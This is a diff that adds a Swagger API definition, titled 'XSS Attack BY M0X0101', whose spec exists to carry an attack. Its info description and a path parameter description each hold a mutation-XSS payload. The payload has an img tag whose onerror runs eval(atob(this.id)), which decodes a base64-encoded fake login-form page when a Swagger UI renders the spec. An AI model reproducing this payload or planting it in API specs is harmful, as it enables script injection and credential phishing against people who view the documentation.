@@ -1,0 +1,40 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxodG1sIGxhbmc9ImVuIj48aGVhZD48bWV0YSBuYW1lPSJ2aXN1YWwiIHNpemU9IjEwMCUiPjx0aXRsZT5Mb2dpbiBGb3JtPC90aXRsZT48c3R5bGU+Ii5sb2dpbi1mb3JtIHsKICAgIG1heC13aWR0aDogNDAwcHg7CiAgICBtYXJnaW46IDUwcHggYXV0bzsKICAgIHBhZGRpbmc6IDIwcHg7CiAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNjY2M7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICBmb250LWZhbWlseTogMDsKICAgIG1hcmdpbjogNTBweCBhdXRvOwogICAgcGFkZGluZzogMjBweDsKICAgIGJvcmRlci1kaXJlY3Rpb246IGJvdGg7CiAgICBib3JkZXItd2lkdGg6IDIwMHB4OwogICAgYm9yZGVyLXJpZ2h0OiA1MHB4OwogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNDE2NTsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIGZvbnQtYmFyOiAwOwogICAgc3Ryb2tlOiAxMHB4OwogICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfTwvc3R5bGU+PC9oZWFkPjxib2R5PjxodG1sIGxhbmc9ImVuIj48ZGl2IGNsYXNzPSJsb2dpbi1mb3JtIj48aDI+TG9naW48L2gyPjxmb3JtPjxpbWcgc3JjPSJodHRwczovL2kuZnJlZS5jb20vR3l5SU92LnBuZyIgOzwvaW1nPjwvZm9ybT48L2Rpdj48L2JvZHk+PC9odG1sPjwvcD4K
+' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxodG1sIGxhbmc9ImVuIj48aGVhZD48bWV0YSBuYW1lPSJ2aXN1YWwiIHNpemU9IjEwMCUiPjx0aXRsZT5Mb2dpbiBGb3JtPC90aXRsZT48c3R5bGU+Ii5sb2dpbi1mb3JtIHsKICAgIG1heC13aWR0aDogNDAwcHg7CiAgICBtYXJnaW46IDUwcHggYXV0bzsKICAgIHBhZGRpbmc6IDIwcHg7CiAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNjY2M7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICBmb250LWZhbWlseTogMDsKICAgIG1hcmdpbjogNTBweCBhdXRvOwogICAgcGFkZGluZzogMjBweDsKICAgIGJvcmRlci1kaXJlY3Rpb246IGJvdGg7CiAgICBib3JkZXItd2lkdGg6IDIwMHB4OwogICAgYm9yZGVyLXJpZ2h0OiA1MHB4OwogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNDE2NTsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIGZvbnQtYmFyOiAwOwogICAgc3Ryb2tlOiAxMHB4OwogICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKfTwvc3R5bGU+PC9oZWFkPjxib2R5PjxodG1sIGxhbmc9ImVuIj48ZGl2IGNsYXNzPSJsb2dpbi1mb3JtIj48aDI+TG9naW48L2gyPjxmb3JtPjxpbWcgc3JjPSJodHRwczovL2kuZnJlZS5jb20vR3l5SU92LnBuZyIgOzwvaW1nPjwvZm9ybT48L2Rpdj48L2JvZHk+PC9odG1sPjwvcD4K
+' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
